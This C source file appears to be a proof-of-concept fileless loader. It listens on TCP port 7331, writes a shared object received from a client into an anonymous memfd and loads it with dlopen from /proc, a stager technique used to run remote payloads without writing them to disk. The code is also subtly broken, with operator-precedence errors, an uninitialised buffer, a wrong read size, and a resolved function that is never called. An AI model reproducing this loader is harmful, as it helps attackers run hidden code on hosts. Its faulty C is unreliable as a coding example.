#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

typedef void* (*so_func_ptr)();

void error(char *msg)
{
	perror(msg);
	exit(-1);
}

int main(int argc, char *argv[])
{
	int listener_fd, so_fd, mem_fd;
	int	client_len, so_recv_len;
	const int port_number = 7331;
	struct sockaddr_in server_addr, client_addr;
	char *so_buffer;
	void *so_handle;
	so_func_ptr so_func;

	listener_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (listener_fd < 0)
		error("[!] ERROR opening socket.");

	memset(&server_addr, '0', sizeof(server_addr));

	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(port_number);

	if (bind(listener_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
		error("[!] ERROR binding.");

	if (listen(listener_fd, 5) == -1)
		error("[!] Error listening.");

	client_len = sizeof(client_addr);
	if ((so_fd = accept(listener_fd, (struct sockaddr *)&client_addr, &client_len)) == -1)
		error("[!] Error accepting a connection.");

	if (mem_fd = memfd_create("freight-train", 0) == -1)
		error("[!] Error create memfd.");

	so_buffer[4096];
	while (so_recv_len = read(so_fd, so_buffer, sizeof(so_buffer)) > 0) {
		write (mem_fd, so_buffer, 4096);
	}

	char location[1024];
	snprintf(location, 1024, "/proc/%d/fd/%d", getpid(), mem_fd);

	if (so_handle = dlopen(location, RTLD_LAZY) == NULL)
		error("[!] Error opening shared object from memory");

	*(void**)(&so_func) = dlsym(so_handle, "freighttrain");


	return 0;
}
